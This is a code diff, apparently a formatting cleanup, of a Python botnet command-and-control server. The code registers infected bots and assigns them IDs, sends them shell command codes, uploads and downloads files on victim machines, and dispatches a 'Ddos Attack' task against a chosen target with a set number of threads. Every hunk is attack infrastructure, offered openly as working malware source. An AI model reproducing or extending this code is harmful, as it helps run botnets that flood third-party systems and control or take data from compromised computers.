@@ -7,15 +7,17 @@ from re import match
 from lib import const
 from . import ssh, sftp
 from hashlib import sha256
-from time import time, sleep  
+from time import time, sleep
 from os import urandom, path
 from threading import Thread
 from datetime import datetime
 
+
 class FTP(object):
 
     def __init__(self, file, bot, download=True):
-        self.sftp = sftp.sFTP(const.PRIVATE_IP, const.FTP_PORT, max_time=60, verbose=True)
+        self.sftp = sftp.sFTP(
+            const.PRIVATE_IP, const.FTP_PORT, max_time=60, verbose=True)
         self.bot_id = bot['bot_id']
         self.shell = bot['shell']
         self.download = download
@@ -25,7 +27,8 @@ class FTP(object):
         self.file = file
 
     def send(self, code, file=None):
-        if not path.exists(file):return
+        if not path.exists(file):
+            return
         self.shell.send(code=code, args=file)
         self.is_alive = True
         self.sftp.send(file)
@@ -46,6 +49,7 @@ class FTP(object):
 
 ######## Tasks #########
 
+
 class Task(object):
 
     def __init__(self, task_id, task_args, task_info_obj):
@@ -61,6 +65,7 @@ class Task(object):
         for bot in [bots[bot] for bot in bots]:
             bot['shell'].send(11)
 
+
 class TaskDdos(object):
 
     def __init__(self, target, threads):
@@ -69,12 +74,15 @@ class TaskDdos(object):
         self.time_assigned = time()
 
     def info(self):
-        time_assigned = datetime.fromtimestamp(self.time_assigned).strftime('%b %d, %Y at %I:%M %p')
-        a = 'Task name: Ddos Attack\nTime assigned: {}\n\n'.format(time_assigned)
+        time_assigned = datetime.fromtimestamp(
+            self.time_assigned).strftime('%b %d, %Y at %I:%M %p')
+        a = 'Task name: Ddos Attack\nTime assigned: {}\n\n'.format(
+            time_assigned)
         b = 'Target: {}\nThreads: {}'.format(self.target, self.threads)
         return a + b
 
 ######## Interface ########
+
 
 class Interface(object):
 
@@ -97,8 +105,10 @@ class Interface(object):
     def gen_bot_id(self, uuid):
         bot_ids = [self.bots[bot]['bot_id'] for bot in self.bots]
         while 1:
-            bot_id = sha256((sha256(urandom(64 * 32) + urandom(64 * 64)).digest().hex() + uuid).encode()).digest().hex()
-            if not bot_id in bot_ids:break
+            bot_id = sha256((sha256(urandom(64 * 32) + urandom(64 * 64)
+                                    ).digest().hex() + uuid).encode()).digest().hex()
+            if not bot_id in bot_ids:
+                break
         return bot_id
 
     @property
@@ -123,7 +133,8 @@ class Interface(object):
             self.close_sess(sess_obj, shell)
         else:
             bot_id = self.gen_bot_id(uuid)
-            self.bots[sess_obj] = { 'bot_id': bot_id, 'uuid': uuid, 'intel': conn_info['args'], 'shell': shell, 'session': sess_obj }
+            self.bots[sess_obj] = {'bot_id': bot_id, 'uuid': uuid,
+                                   'intel': conn_info['args'], 'shell': shell, 'session': sess_obj}
             self.sig = self.signature
             print(self.bots)
             if self.task:
@@ -132,7 +143,7 @@ class Interface(object):
     def close_sess(self, sess_obj, shell_obj):
         print('Closing session ...')
         shell_obj.is_alive = False
-        shell_obj.send(code=7, args=None) # 7 - disconnect
+        shell_obj.send(code=7, args=None)  # 7 - disconnect
 
         sess_obj.close()
         if sess_obj in self.bots:
@@ -170,7 +181,8 @@ class Interface(object):
             if self.ssh:
                 self.ssh.close()
 
-            self.ssh = ssh.SSH(const.PRIVATE_IP, const.SSH_PORT, max_time=30, verbose=True)
+            self.ssh = ssh.SSH(const.PRIVATE_IP, const.SSH_PORT,
+                               max_time=30, verbose=True)
             sock_obj = self.ssh.start()
 
             if sock_obj:
@@ -199,7 +211,7 @@ class Interface(object):
         if self.ftp:
             if all([self.ftp.is_alive, not override]):
                 return 'Already {} {} {} {}. Use --override option to override this process'.format('Downloading' if self.ftp.download else 'Uploading',
-                                           self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
+                                                                                                    self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
             else:
                 self.ftp.close()
 
@@ -216,11 +228,11 @@ class Interface(object):
             return 'No file transfer in progress'
         if self.ftp.is_alive:
             return '{} {} {} {}. Check back in 1 minute'.format('Downloading' if self.ftp.download else 'Uploading',
-                                        self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
+                                                                self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
         else:
             return 'Attempted to {} {} {} {}. The process {} a success. Time-elapsed: {}(sec)'.format('download' if self.ftp.download else 'upload',
-                                        self.ftp.file, 'from' if self.ftp.download else 'to',
-                                        self.ftp.bot_id[:8], 'was' if self.ftp.success else 'was not', self.ftp.time)
+                                                                                                      self.ftp.file, 'from' if self.ftp.download else 'to',
+                                                                                                      self.ftp.bot_id[:8], 'was' if self.ftp.success else 'was not', self.ftp.time)
 
     def execute_cmd_by_id(self, bot_id, cmd_id, args):
         override = True if '--override' in args else False
@@ -281,10 +293,10 @@ class Interface(object):
             return 'Failed to send command'
         cmd_id = int(cmd_id)
 
-        if cmd_id == 0: # stop task
+        if cmd_id == 0:  # stop task
             Thread(target=self.stop_task, daemon=True).start()
             return 'Task terminated' if self.task else 'No task is set'
-        elif cmd_id == 1: # status
+        elif cmd_id == 1:  # status
             return self.get_task()
         else:
             resp = self.set_task(cmd_id, args)
@@ -298,13 +310,13 @@ class Interface(object):
         return 'No task is set' if not self.task else self.task.task_info_obj.info()
 
     def set_task(self, task_id, args):
-        if task_id == 2: # ddos
+        if task_id == 2:  # ddos
             return self.set_ddos_task(args)
         else:
             return 'Failed to set task'
 
     def set_ddos_task(self, args):
-        task_id = 1 # the the bot side
+        task_id = 1  # the the bot side
         if not len(args) == 3:
             return 'Invalid amount of arguments'
 
